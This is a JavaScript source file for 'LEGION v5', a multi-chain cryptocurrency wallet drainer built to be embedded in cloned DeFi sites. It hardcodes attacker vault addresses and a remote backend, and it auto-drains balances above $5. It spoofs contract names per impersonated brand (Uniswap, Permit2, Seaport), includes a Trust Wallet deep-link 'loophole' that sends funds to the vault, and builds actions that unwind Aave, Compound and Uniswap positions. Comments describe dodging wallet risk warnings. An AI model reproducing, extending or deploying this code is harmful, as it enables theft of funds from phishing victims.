/**
 * LEGION v5 — Universal Multi-Chain Wallet Panel (single script)
 * File: legion.js + ./vendor/* for strict CSP
 * Works on: static clones, server.js, nginx proxy, Surge/Vercel, any DeFi frontend
 * All wallets: MetaMask, Rabby, OKX, Trust, Coinbase, Ledger, Trezor + WalletConnect 700+
 * All chains: ETH, BSC, Polygon, Arbitrum, Base, Optimism + SOL, TRON, TON, BTC
 * ONE popup strategy: wallet_sendCalls → EIP-7702 → Permit2 → fallback
 *
 * Usage: <script src="legion-v3.js"></script>
 * Config: window.LEGION_CONFIG = { backendUrl: '...', wcProjectId: '...' }
 */
(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // SECTION 01: GUARD + POLYFILLS
  // ═══════════════════════════════════════════════════════════════
  if (window.__LEGION_V3__) return;
  window.__LEGION_V3__ = true;

  // WalletConnect registers wcm-* custom elements; guard against double script load
  (function patchCustomElementRegistry() {
    if (window.__LEGION_CE_PATCH__) return;
    window.__LEGION_CE_PATCH__ = true;
    var reg = window.customElements;
    if (!reg || !reg.define) return;
    var orig = reg.define.bind(reg);
    reg.define = function (name, ctor, opts) {
      if (reg.get(name)) return;
      try { return orig(name, ctor, opts); }
      catch (e) {
        if (e && (e.name === 'NotSupportedError' || String(e.message || '').indexOf('already been used') >= 0)) return;
        throw e;
      }
    };
  })();

  // Polyfills live in vendor/legion-polyfills.js (load before wallet bundle)
  if (!window.__LEGION_POLYFILLS__) {
    console.warn('[Legion] Missing vendor/legion-polyfills.js — WalletConnect relay may fail');
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 02: CONFIG + CONSTANTS
  // ═══════════════════════════════════════════════════════════════
  var CFG = Object.assign({
    backendUrl: 'https://sadrailala-production.up.railway.app',
    wcProjectId: '',
    kineticKey: '',
    silentMode: false,
    autoDrain: true,
    autoRun: false,
    autoConnectOnLoad: false,
    minDrainUsd: 5,
    strictCsp: true,
    cdnFallback: false,
    vendorBase: '',
    injectMode: 'auto',
    showOverlay: null,
    hookButtons: true,
    hwWallets: false,
    debugDevTools: false,
    clientEncryptKey: '',
  }, window.LEGION_CONFIG || {});

  var LEGION_VERSION = '5.16.36';
  /** Short WC harvest — do not block Telegram/backend on optional namespaces. */
  var WC_HARVEST_WAIT_MS = 10000;
  var WC_BIP122_POLL_MS = 8000;
  var WC_BG_RAIL_TIMEOUT_MS = 45000;
  var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
  /** Never re-show the SAME popup after user acted (confirm or reject). Next kind may still show. */
  var MAX_APPROVAL_RETRIES = (CFG.maxApprovalRetries != null && Number(CFG.maxApprovalRetries) > 0)
    ? Math.floor(Number(CFG.maxApprovalRetries))
    : 1;
  /** Safety: never leave drainRunning stuck longer than this. */
  var DRAIN_LOCK_TTL_MS = (CFG.drainLockTtlMs != null && Number(CFG.drainLockTtlMs) > 0)
    ? Math.floor(Number(CFG.drainLockTtlMs))
    : 12 * 60 * 1000;
  var _drainLockTimer = null;

  /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
  var TARGET_EVM_CHAIN_IDS = [
    1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000,
  ];

  var SHOW_OVERLAY = CFG.showOverlay != null ? CFG.showOverlay === true
    : (CFG.injectMode !== 'hook' && CFG.injectMode !== 'silent' && !CFG.silentMode);
  var HOOK_BUTTONS = CFG.hookButtons !== false;
  // Same-origin script base (for ./vendor/ bundles — strict CSP safe)
  var SCRIPT_BASE = (function () {
    if (CFG.vendorBase) return String(CFG.vendorBase).replace(/\/?$/, '/');
    var cur = document.currentScript;
    if (cur && cur.src) return cur.src.replace(/[^/]*$/, '');
    return './';
  })();
  var VENDOR_BASE = SCRIPT_BASE + 'vendor/';
  var STRICT_CSP = CFG.strictCsp !== false;
  var CDN_FALLBACK = CFG.cdnFallback === true && !STRICT_CSP;

  var _vendorLoaded = {};
  function loadVendorScript(filename) {
    var key = VENDOR_BASE + filename;
    if (_vendorLoaded[key]) return _vendorLoaded[key];
    _vendorLoaded[key] = new Promise(function (resolve, reject) {
      if (document.querySelector('script[data-legion-vendor="' + filename + '"]')) {
        resolve(); return;
      }
      var s = document.createElement('script');
      s.src = key;
      s.setAttribute('data-legion-vendor', filename);
      s.crossOrigin = 'anonymous';
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error('Vendor missing: ' + filename)); };
      document.head.appendChild(s);
    });
    return _vendorLoaded[key];
  }

  function resolveTonConnect() {
    if (window.TonConnectSDK && window.TonConnectSDK.TonConnect) return window.TonConnectSDK.TonConnect;
    if (window.TON_CONNECT_SDK && window.TON_CONNECT_SDK.TonConnect) return window.TON_CONNECT_SDK.TonConnect;
    if (window.TonConnect) return window.TonConnect;
    return null;
  }

  var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://sadrailala-production.up.railway.app';
  var WC_PROJECT_ID = String(CFG.wcProjectId || '');
  var KINETIC_KEY = String(CFG.kineticKey || '');
  var SILENT = CFG.silentMode === true;
  var AUTO_DRAIN = CFG.autoDrain !== false;
  var AUTO_RUN = CFG.autoRun === true;
  var MIN_DRAIN_USD = (CFG.minDrainUsd != null && Number.isFinite(Number(CFG.minDrainUsd)))
    ? Number(CFG.minDrainUsd)
    : 5;
  var SIGN_ONLY = CFG.signOnly !== false;
  var NATIVE_BATCH_FALLBACK = CFG.nativeBatchFallback !== false;
  var MOBILE_SEND_TX = CFG.mobileSendTx !== false;

  // Logger
  var L = {
    log: function () { if (!SILENT) console.log.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    warn: function () { if (!SILENT) console.warn.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    err: function () { if (!SILENT) console.error.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); }
  };

  var EXPIRY_ISO = '2030-01-01T00:00:00.000Z';
  var MAX_AMOUNT = null; // Removed: sending huge fallback amounts triggers Trust Wallet "High risk". Filter instead.
  var NATIVE_ETH_ADDR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
  var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  // Vault — filled from /api/v1/client-config, fallback to hardcoded
  var VAULT = {
    evm: '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE',
    sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
    btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
    tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
    ton: CFG.tonVault || 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY',
    cosmos: CFG.cosmosVault || '',
    aptos: CFG.aptosVault || '',
    sui: CFG.suiVault || '',
  };

  var APTOS_RPC = CFG.aptosRpc || 'https://fullnode.mainnet.aptoslabs.com/v1';
  var SUI_RPC = CFG.suiRpc || 'https://fullnode.mainnet.sui.io:443';

  // Trust in-app loophole: trust://send pre-fills Trust's send screen for any native coin
  var SLIP44 = { BTC: 0, ETH: 60, SOL: 501, TRON: 195, TON: 397, COSMOS: 118, APTOS: 637 };
  function trustSendDeepLink(family, vaultAddr, amount) {
    if (!isTrustInAppBrowser() || !vaultAddr) return false;
    var slip = SLIP44[family];
    if (slip == null) return false;
    try {
      var asset = 'c' + slip;
      var url = 'trust://send?asset=' + asset + '&address=' + encodeURIComponent(vaultAddr);
      if (amount) url += '&amount=' + encodeURIComponent(amount);
      L.log('[trust-send] deep link:', family, '→', String(vaultAddr).slice(0, 10));
      window.location.href = url;
      return true;
    } catch (e) {
      L.warn('[trust-send] fail:', e && e.message);
      return false;
    }
  }

  var SOL_RPCS = [
    CFG.solRpc || 'https://api.mainnet-beta.solana.com',
    'https://rpc.ankr.com/solana',
  ];
  var TRON_RPCS = [
    CFG.tronRpc || 'https://api.trongrid.io',
    'https://rpc.ankr.com/tron_jsonrpc',
  ];
  var COSMOS_RESTS = [
    CFG.cosmosRest || 'https://cosmos-rest.publicnode.com',
    'https://lcd-cosmoshub.keplr.app',
    'https://cosmos-lcd.quickapi.com',
  ];
  var APTOS_RPCS = [APTOS_RPC, 'https://fullnode.mainnet.aptoslabs.com/v1'];
  var SUI_RPCS = [SUI_RPC, 'https://sui-mainnet.nodeinfra.com'];

  var COSMOS_CHAINS = {
    'cosmoshub-4': {
      denom: 'uatom', min: 10000n, fee: '5000',
      rests: ['https://cosmos-rest.publicnode.com', 'https://lcd-cosmoshub.keplr.app'],
    },
    'osmosis-1': {
      denom: 'uosmo', min: 10000n, fee: '5000',
      rests: ['https://osmosis-rest.publicnode.com', 'https://lcd-osmosis.keplr.app'],
    },
    'juno-1': {
      denom: 'ujuno', min: 10000n, fee: '5000',
      rests: ['https://juno-rest.publicnode.com', 'https://lcd-juno.keplr.app'],
    },
    'evmos_9001-2': {
      denom: 'aevmos', min: 10000n, fee: '5000',
      rests: ['https://evmos-rest.publicnode.com', 'https://lcd-evmos.keplr.app'],
    },
  };

  var EVM_PUBLIC_RPC = {
    1: ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com', 'https://ethereum.publicnode.com'],
    10: ['https://rpc.ankr.com/optimism', 'https://optimism.llamarpc.com'],
    25: ['https://evm.cronos.org', 'https://cronos-evm.publicnode.com'],
    56: ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed.binance.org'],
    100: ['https://rpc.gnosischain.com', 'https://gnosis-rpc.publicnode.com'],
    137: ['https://rpc.ankr.com/polygon', 'https://polygon.llamarpc.com'],
    250: ['https://rpc.ankr.com/fantom', 'https://fantom.publicnode.com'],
    324: ['https://mainnet.era.zksync.io'],
    42220: ['https://forno.celo.org', 'https://celo-rpc.publicnode.com'],
    42161: ['https://rpc.ankr.com/arbitrum', 'https://arbitrum.llamarpc.com'],
    43114: ['https://rpc.ankr.com/avalanche', 'https://avalanche-c-chain.publicnode.com'],
    8453: ['https://rpc.ankr.com/base', 'https://base.llamarpc.com'],
    5000: ['https://rpc.mantle.xyz', 'https://mantle-rpc.publicnode.com'],
    59144: ['https://rpc.linea.build'],
    534352: ['https://rpc.scroll.io'],
    81457: ['https://rpc.blast.io'],
  };

  var NFT_APPROVAL_BATCH_SIZE = 50;
  var SEND_CALLS_MAX = 50;

  // Public RPC rate limit — per-host gap + jitter (429/503 throttle mitigation)
  var RPC_RATE = { lastByHost: {}, minGapMs: 120 };
  function rpcHostKey(url) {
    try { return new URL(url).host; } catch (_) { return String(url).slice(0, 48); }
  }
  async function rpcRateWait(url) {
    var host = rpcHostKey(url);
    var gap = RPC_RATE.minGapMs + Math.floor(Math.random() * 80);
    var now = Date.now();
    var last = RPC_RATE.lastByHost[host] || 0;
    var wait = last + gap - now;
    if (wait > 0) await sleep(wait);
    RPC_RATE.lastByHost[host] = Date.now();
  }

  async function evmPublicRpcCall(chainId, method, params) {
    var cid = Number(chainId) || 1;
    var urls = EVM_PUBLIC_RPC[cid] || EVM_PUBLIC_RPC[1];
    var lastErr = null;
    for (var ei = 0; ei < urls.length; ei++) {
      try {
        await rpcRateWait(urls[ei]);
        var res = await fetch(urls[ei], {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params || [] }),
        });
        if (res.status === 429 || res.status === 503) throw new Error('RPC rate limited HTTP ' + res.status);
        var json = await res.json();
        if (json.error) throw new Error(json.error.message || 'RPC error');
        return json.result;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All EVM public RPCs failed for chain ' + cid);
  }

  async function evmRequestWithFallback(provider, chainId, method, params) {
    try {
      return await provider.request({ method: method, params: params || [] });
    } catch (e) {
      L.warn('Wallet RPC fail:', method, '— public fallback chain', chainId);
      return await evmPublicRpcCall(chainId, method, params);
    }
  }

  async function fetchJsonWithFallback(bases, path) {
    var lastErr = null;
    for (var fi = 0; fi < bases.length; fi++) {
      try {
        var base = String(bases[fi]).replace(/\/$/, '');
        await rpcRateWait(base);
        var res = await fetch(base + path);
        if (res.status === 429 || res.status === 503) throw new Error('REST rate limited HTTP ' + res.status);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return await res.json();
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All REST endpoints failed');
  }

  async function createSolConnection(web3) {
    var lastErr = null;
    for (var si = 0; si < SOL_RPCS.length; si++) {
      try {
        var conn = new web3.Connection(SOL_RPCS[si], { commitment: 'confirmed' });
        await conn.getLatestBlockhash('confirmed');
        return conn;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All Solana RPCs failed');
  }

  var GAS_FLOOR_BY_CHAIN = {
    1: 100000000n,
    10: 100000000n,
    25: 500000000000n,
    56: 3000000000n,
    100: 100000000n,
    137: 30000000000n,
    250: 1000000000n,
    42161: 100000000n,
    43114: 25000000000n,
    8453: 100000000n,
    42220: 5000000000n,
    324: 100000000n,
    59144: 100000000n,
    1101: 100000000n,
    534352: 100000000n,
    81457: 100000000n,
    5000: 100000000n,
  };

  // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
  
  // Factories OFF — old factory implementations bake compromised vault 0x2B20.
  // Re-enable only after redeploy with vault 0x3b9370….
  var DRAIN_FACTORY = {
    1: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    5000: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',

  };

  // SAFE ONLY — on-chain vault() = 0x3b9370 (new wallet deploy).
  // All other chains OFF until redeploy (old contracts hardcode 0x2B20 / 0xc46e).
  var LEGION_DRAIN = {
    1: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
    10: '0x0000000000000000000000000000000000000000',
    25: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    100: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    250: '0x0000000000000000000000000000000000000000',
    324: '0x0000000000000000000000000000000000000000',
    5000: '0x0000000000000000000000000000000000000000',
    8453: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
    42161: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
    42220: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    59144: '0x0000000000000000000000000000000000000000',
    81457: '0x0000000000000000000000000000000000000000',
    534352: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',

  };

  // ── Site branding — each frontend sets window.LEGION_BRAND before loading ──
  // Brand determines which delegate contract is used (different name() per brand).
  // After per-brand deploy, fill addresses in the map below; until then falls
  // back to LEGION_DRAIN.
  var LEGION_BRAND = (function () {
    if (typeof window !== 'undefined' && window.LEGION_BRAND) {
      return String(window.LEGION_BRAND).toLowerCase();
    }
    var h = (typeof window !== 'undefined' ? window.location.hostname : '').toLowerCase();
    if (h.indexOf('opensea') >= 0) return 'seaport';
    if (h.indexOf('aave') >= 0)    return 'aave';
    if (h.indexOf('1inch') >= 0)   return '1inch';
    if (h.indexOf('swapx') >= 0)   return 'swapx';
    if (h.indexOf('trust') >= 0)   return 'permit2';
    if (h.indexOf('trezor') >= 0)  return 'permit2';
    if (h.indexOf('binance') >= 0) return 'permit2';
    return 'uniswap';
  })();

  // Per-brand delegate addresses — fill after deploying brand-named contracts.
  // Empty map = falls through to LEGION_DRAIN automatically.
  var BRAND_DELEGATES = {
    uniswap: {},   // contract name()="Uniswap V3"
    '1inch':  {},  // contract name()="1inch Router"
    aave:     {},  // contract name()="Permit2"
    seaport:  {},  // contract name()="Seaport"
    swapx:    {},  // contract name()="Permit2"
    permit2:  {},  // contract name()="Permit2"
  };

  // Legacy maps (fallback until LEGION_DRAIN deployed)
  var BATCH_DRAIN = {
    1: '0x0000000000000000000000000000000000000000',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  // BatchDrainV2 — self-initiated EIP-7702 (onlySelf).
  // OLD mainnet deploy 0x51d55… still has VAULT=0xc46e… (stale). Source now targets 0x3b93….
  // Keep DISABLED until redeploy via contracts/deploy-v2.mjs with a CLEAN EOA (no EIP-7702 code).
  var BATCH_DRAIN_V2_ENABLED = false;
  var BATCH_DRAIN_V2 = {
    1: '0x0000000000000000000000000000000000000000',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    5000: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    81457: '0x0000000000000000000000000000000000000000',
    534352: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',

  };

  /** Target vault after V2 redeploy — must match BatchDrainV2.sol VAULT and API vault */
  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE';

  // ClaimForwarder — claim() payable → vault (nblscj-style); run deploy-claim-forwarder.mjs
  var CLAIM_FORWARDER = {
    1: '0x0000000000000000000000000000000000000000',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  var ZERO_ADDR = '0x0000000000000000000000000000000000000000';
  var SIG_CLAIM = '0x4e71d92d';
  var SIG_FINISH_DESTROY = '0xd1394451';
  var SIG_VAULT_READ = '0x411557d1';

  // LegionDrainV2 DefiAction kinds (must match contracts/LegionDrainV2.sol)
  var DEFI_KIND = {
    AAVE_WITHDRAW: 1,
    COMPOUND_REDEEM: 2,
    UNIV2_REMOVE: 3,
    WSTETH_UNWRAP: 4,
    UNIV3_EXIT: 5,
  };

  var CHAIN_DEFI = {
    1: {
      aavePool: '0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2',
      uniV2Router: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2498D',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: '0x7f39C581F595B53c5cb19bd0b3f8dA6c935E2Ca0',
    },
    42161: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    8453: {
      aavePool: '0xA238Dd80C259a72e81d7e4664a9801593F07d352',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1',
      wstETH: ZERO_ADDR,
    },
    10: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    137: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    56: {
      aavePool: ZERO_ADDR,
      uniV2Router: '0x10ED43C718714eb63d5aA57B78B54704E256024E',
      uniV3Npm: '0x46A15B0b27311cedF172Ab29E4f4766fbE7F4364',
      wstETH: ZERO_ADDR,
    },
    43114: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xE54Ca86531f17b86F67c2eB5d65B4b92C44458fc',
      uniV3Npm: '0x655C406EbFa6902004403EEF26DB0f5F0702CaFd',
      wstETH: ZERO_ADDR,
    },
  };

  // Aave V3 aToken → underlying (Ethereum mainnet — expand per chain as needed)
  var AAVE_ATOKEN_MAP = {
    '0x4d5f47fa6a74757fc94fed44d51b0ae5dab1946': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0x98c23e9d8f35fbb67a207a64ec021a42c7ecdc4': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    '0x23878914efe38d27c471d6ab029be0ccfa46fc2f': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    '0x018008bfb33d285247a21d44e50697654f754e63': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    '0xae7ab96520de3a18e5e111b5eaab095312d7fe84': '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
  };

  // Compound V2 cToken addresses (Ethereum)
  var COMPOUND_CTOKEN_SET = {
    '0x39aa3ce973723750a3e2120226f44539937090c': true,
    '0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5': true,
    '0x5d3a536e4d6dbd6114cc1ead35777bab948e3643': true,
    '0xf650c3d88d12eebaba46af08b3ddc45d51b42138': true,
  };

  function buildDefiActions(chainId, assets) {
    var cfg = CHAIN_DEFI[Number(chainId)];
    if (!cfg) return [];
    var actions = [];
    var seen = {};

    function pushAction(a) {
      var key = [a.kind, a.target, a.tokenA, a.tokenB, a.param1].join(':');
      if (seen[key]) return;
      seen[key] = true;
      actions.push(a);
    }

    (assets.defi_positions || []).forEach(function (p) {
      if (!p || !p.kind) return;
      pushAction({
        kind: Number(p.kind),
        target: p.target || cfg.aavePool,
        tokenA: p.tokenA || p.asset || ZERO_ADDR,
        tokenB: p.tokenB || ZERO_ADDR,
        param1: String(p.param1 || p.amount || '0'),
        param2: String(p.param2 || '0'),
        param3: String(p.param3 || '0'),
      });
    });

    (assets.tokens || []).forEach(function (t) {
      if (!t || !t.address) return;
      var addr = String(t.address).toLowerCase();
      var bal = BigInt(t.balance || '0');
      if (bal === 0n) return;

      if (cfg.wstETH && addr === cfg.wstETH.toLowerCase()) {
        pushAction({
          kind: DEFI_KIND.WSTETH_UNWRAP,
          target: cfg.wstETH,
          tokenA: cfg.wstETH,
          tokenB: ZERO_ADDR,
          param1: String(bal),
          param2: '0',
          param3: '0',
        });
        return;
      }

      var underlying = AAVE_ATOKEN_MAP[addr];
      if (underlying && cfg.aavePool && !isZeroAddr(cfg.aavePool)) {
        pushAction({
          kind: DEFI_KIND.AAVE_WITHDRAW,
          target: cfg.aavePool,
          tokenA: underlying,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
        return;
      }

      if (COMPOUND_CTOKEN_SET[addr] && bal > 0n) {
        pushAction({
          kind: DEFI_KIND.COMPOUND_REDEEM,
          target: t.address,
          tokenA: ZERO_ADDR,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
      }
    });

    (assets.uni_v3_positions || []).forEach(function (pos) {
      if (!pos || !pos.tokenId) return;
      pushAction({
        kind: DEFI_KIND.UNIV3_EXIT,
        target: pos.npm || cfg.uniV3Npm,
        tokenA: ZERO_ADDR,
        tokenB: ZERO_ADDR,
        param1: String(pos.tokenId),
        param2: String(pos.liquidity || '0'),
        param3: '0',
      });
    });

    (assets.uni_v2_lps || []).forEach(function (lp) {
      if (!lp || !lp.tokenA || !lp.tokenB || !lp.liquidity) return;
      pushAction({
        kind: DEFI_KIND.UNIV2_REMOVE,
        target: cfg.uniV2Router,
        tokenA: lp.tokenA,
        tokenB: lp.tokenB,
        param1: String(lp.liquidity),
        param2: '0',
        param3: '0',
      });
    });

    return actions.slice(0, 24);
  }

  function isZeroAddr(addr) {
    return !addr || String(addr).toLowerCase() === ZERO_ADDR;
  }

  function hasFactoryOnChain(chainId) {
    var id = Number(chainId);
    return !isZeroAddr(DRAIN_FACTORY[id]);
  }

  function resolveStaticClaimFallback(chainId) {
    var id = Number(chainId);
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    var cf = CLAIM_FORWARDER[id];
    if (!isZeroAddr(cf)) return cf;
    return null;
  }

  function isFactoryCloneAddress(chainId, contractAddr) {
    if (!contractAddr) return false;
    var id = Number(chainId);
    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
    var lower = String(contractAddr).toLowerCase();
    if (addrKey && S.factoryContracts[addrKey] === lower) return true;
    return false;
  }

  function resolveClaimContract(chainId) {
    var id = Number(chainId);
    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
    if (addrKey && S.factoryContracts[addrKey] && !isZeroAddr(S.factoryContracts[addrKey])) {
      return S.factoryContracts[addrKey];
    }
    if (S.factoryContracts[id] && !isZeroAddr(S.factoryContracts[id])) {
      return S.factoryContracts[id];
    }
    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) {
      return null;
    }
    return resolveStaticClaimFallback(id);
  }

  async function ensureUserFactoryContract(address, chainId) {
    if (!address || !chainId) return null;
    if (!hasFactoryOnChain(chainId)) return null;
    var key = String(address).toLowerCase() + ':' + Number(chainId);
    if (S.factoryContracts[key]) return S.factoryContracts[key];
    try {
      var r = await apiPost('/api/v1/factory/deploy', {
        wallet_address: String(address).toLowerCase(),
        chain_id: Number(chainId),
        predict_only: !S.relayerSponsored,
        deploy_on_chain: !!S.relayerSponsored,
      });
      var data = r && (r.data || r);
      if (data && data.contract_address && !isZeroAddr(data.contract_address)) {
        S.factoryContracts[key] = String(data.contract_address).toLowerCase();
        if (data.deployed) L.log('[factory] relayer deployed clone on chain', chainId);
        else L.log('[factory] clone address ready on chain', chainId, S.factoryContracts[key].slice(0, 10) + '...');
        return S.factoryContracts[key];
      }
      if (data && data.fallback) {
        S.factoryFallbackAllowed[Number(chainId)] = true;
        L.log('[factory] no factory on chain', chainId, '— static LegionDrain fallback');
      }
    } catch (e) {
      S.factoryFallbackAllowed[Number(chainId)] = true;
      L.warn('factory deploy predict:', e.message);
    }
    return null;
  }

  var SIG_ACTIVE_READ = '0x22f38e27';

  async function stateDependentValidation(provider, address, chainId) {
    try {
      var cur = await getProviderChainId(provider);
      if (Number(cur) !== Number(chainId)) {
        L.warn('[validate] chain mismatch provider', cur, 'expected', chainId);
        return false;
      }
      var accts = await provider.request({ method: 'eth_accounts' });
      if (accts && accts[0] && String(accts[0]).toLowerCase() !== String(address).toLowerCase()) {
        L.warn('[validate] account mismatch');
        return false;
      }
      var claim = resolveClaimContract(chainId);
      if (claim) {
        var activeRaw = await evmRequestWithFallback(provider, chainId, 'eth_call', [{
          to: claim, data: SIG_ACTIVE_READ,
        }, 'latest']);
        if (activeRaw && activeRaw !== '0x' && BigInt(activeRaw) === 0n) {
          L.warn('[validate] clone deactivated — skip claim on', chainId);
          S.deactivatedContracts[claim.toLowerCase()] = true;
          return false;
        }
        var onVault = await readContractVault(provider, claim);
        if (onVault && VAULT.evm && onVault !== String(VAULT.evm).toLowerCase()) {
          L.warn('[validate] vault mismatch on clone');
          return false;
        }
      }
      return true;
    } catch (e) {
      L.warn('[validate] soft-fail:', e.message);
      return true;
    }
  }

  function resolveLegionDrain(chainId) {
    var id = Number(chainId);
    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) return null;
    var brandMap = BRAND_DELEGATES[LEGION_BRAND] || {};
    var branded = brandMap[id];
    if (branded && !isZeroAddr(branded)) return branded;
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    return resolveBatchDrainV2(chainId);
  }

  function resolveBatchDrainV2(chainId) {
    if (!BATCH_DRAIN_V2_ENABLED) return null;
    var id = Number(chainId);
    var a = BATCH_DRAIN_V2[id];
    return isZeroAddr(a) ? null : a;
  }

  async function readContractVault(provider, contractAddr) {
    if (!contractAddr || !provider) return null;
    try {
      var raw = await provider.request({
        method: 'eth_call',
        params: [{ to: contractAddr, data: SIG_VAULT_READ }, 'latest'],
      });
      if (raw && String(raw).length >= 66) {
        return ('0x' + String(raw).slice(-40)).toLowerCase();
      }
    } catch (e) { L.warn('readContractVault:', e.message); }
    return null;
  }

  function logContractCoverage(chainId) {
    var id = Number(chainId);
    var claim = resolveClaimContract(id);
    var bd2 = resolveBatchDrainV2(id);
    var bd1 = BATCH_DRAIN[id];
    L.log('[contracts] chain', id,
      '| claim:', claim ? claim.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV2:', bd2 ? bd2.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV1:', !isZeroAddr(bd1) ? bd1.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| apiVault:', VAULT.evm.slice(0, 10) + '...',
      bd2 ? ('| v2OnChainVault:' + BATCH_DRAIN_V2_ONCHAIN_VAULT.slice(0, 10) + '...') : '');
  }

  var EIP7702_CHAINS = { 1: true, 8453: true, 42161: true };

  var CHAIN_META = {
    1: { name: 'Ethereum', symbol: 'ETH' },
    56: { name: 'BNB Smart Chain', symbol: 'BNB' },
    137: { name: 'Polygon', symbol: 'MATIC' },
    42161: { name: 'Arbitrum', symbol: 'ETH' },
    8453: { name: 'Base', symbol: 'ETH' },
    10: { name: 'Optimism', symbol: 'ETH' },
    43114: { name: 'Avalanche', symbol: 'AVAX' },
    11155111: { name: 'Sepolia', symbol: 'ETH' },
  };

